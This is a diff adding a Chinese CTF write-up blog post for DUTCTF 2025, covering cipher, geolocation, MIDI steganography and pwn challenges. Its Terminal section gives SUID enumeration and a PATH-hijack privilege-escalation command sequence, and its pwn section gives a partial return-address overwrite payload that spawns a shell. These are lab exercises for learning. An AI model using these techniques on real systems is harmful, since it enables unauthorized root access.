@@ -1,0 +1,130 @@
+---
+title: "2025科技文化节个人WriteUp"
+description: "第一次打比赛 好玩"
+pubDate: "May 1 2025"
+categories:
+  - tech
+tags:
+  - CTF
+  - WriteUp
+---
+# Misc
+
+## Signin
+
+![1746071455735](image/dlut2025_5_1/1746071455735.png)
+
+`D{m2uD!UFW0E_oDT_u5}TT3c_O2_CfTrC1TsTE`一眼乱序，栅栏密码解密后得到 `DUTCTF{W31c0mE_TO_2o2s_DuTCTf_DuTEr5!}`
+
+## 特定低手
+
+![1746071579515](image/dlut2025_5_1/1746071579515.png)
+
+发现桥上有字
+
+![1746071605763](image/dlut2025_5_1/1746071605763.png)
+
+调用语言模型无脑开启联网搜索
+
+```log
+地上写着 バス専用
+
+7:30 - 9:00 Overpass有个明治通り (Meiji Dōri)
+
+豊島区目白三丁目 (Toshima-ku Mejiro San-chōme)给我具体经纬度
+```
+
+[google地图](https://www.google.com/maps/@35.7204533,139.7130719,3a,75y,353.8h,91.22t/data=!3m7!1e1!3m5!1sXsk9Ia4QsuXgbWyH5aVmMQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D-1.2232476107826642%26panoid%3DXsk9Ia4QsuXgbWyH5aVmMQ%26yaw%3D353.79558674265166!7i16384!8i8192!5m1!1e2?entry=ttu&g_ep=EgoyMDI1MDQyOC4wIKXMDSoJLDEwMjExNDUzSAFQAw%3D%3D)
+
+邮编数字部分 `1710032`
+
+## Terminal
+
+```log
+test@046413259f36:~$ find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
+  4599371     40 -rwxr-sr-x   1 root     shadow      39160 Sep 22  2023 /usr/sbin/unix_chkpwd
+  4603694     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+  4603899    640 -rwsr-xr-x   1 root     root         653888 Feb 14 21:06 /usr/lib/openssh/ssh-keysign
+  4597709     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
+  4597715     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
+  4597706     80 -rwxr-sr-x   1 root     shadow        80376 Mar 23  2023 /usr/bin/chage
+  4597926     36 -rwsr-xr-x   1 root     root          35128 Nov 22 04:01 /usr/bin/umount
+  4597850     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
+  4597776     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
+  4597834     60 -rwsr-xr-x   1 root     root          59704 Nov 22 04:01 /usr/bin/mount
+  4597902     72 -rwsr-xr-x   1 root     root          72000 Nov 22 04:01 /usr/bin/su
+  4597839     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
+  4597760     32 -rwxr-sr-x   1 root     shadow        31184 Mar 23  2023 /usr/bin/expiry
+  4602046    476 -rwxr-sr-x   1 root     _ssh         485760 Feb 14 21:06 /usr/bin/ssh-agent
+  4609046     16 -rwsr-xr-x   1 root     root          16064 Feb 28 15:46 /tmp/whatisthis
+test@046413259f36:~$/tmp/whatisthis
+    PID TTY          TIME CMD
+     23 pts/0    00:00:00 whatisthis
+     24 pts/0    00:00:00 sh
+     25 pts/0    00:00:00 ps
+test@046413259f36:~$ echo '/bin/sh' > ~/ps
+test@046413259f36:~$ chmod +x ~/ps
+test@046413259f36:~$ export PATH=~:$PATH
+test@046413259f36:~$ /tmp/whatisthis
+```
+
+`/tmp/whatisthis` -> `whatisthis` 程序内部启动 `sh` -> `sh` 执行 `ps` 命令 -> `ps` 输出进程列表
+
+路径劫持直接提权
+
+## 我是少女乐队高手
+
+![1746073253632](image/dlut2025_5_1/1746073253632.png)
+
+两个音轨 相同记为 `0` 不同记为 `1`
+
+`midi2csv` 转换后提取出
+
+```python
+a = "00010100100100011001010110010101010101000100110001010100100100011101100101001100100011000100110001011000110111101001000110011010100101100000110010011101110111011101100100011010100100111000111001"
+len(a) == 194
+```
+
+多两位 把前两个丢了
+
+![1746074085942](image/dlut2025_5_1/1746074085942.png)
+
+# pwn
+
+## minesweeper
+
+`No canary found` 栈溢出
+
+```c
+__int64 read_int(void)
+{
+  unsigned int buf; // [rsp+Ch] [rbp-4h] BYREF
+
+  read(0, &buf, 0x10uLL);
+  return buf;
+}
+```
+
+```log
+win(void)	.text	000000000000222F	00000030	00000008		.	.	.	.	.	.	B	T	.
+```
+
+```python
+payload = b'A'*12 + b'F'
+print(f"[*] Sending payload ({len(payload)} bytes): {payload}")
+io.send(payload)  # Use send() for read(), not sendline()
+print("[+] Payload sent.")
+io.interactive()
+```
+
+`/bin/sh` 提权
+
+## kernel_master
+
+解压一下就拿到了`flag{test}`
+
+本题不会做 纯误判
+
+# Web
+
+## Real_E2_J5!
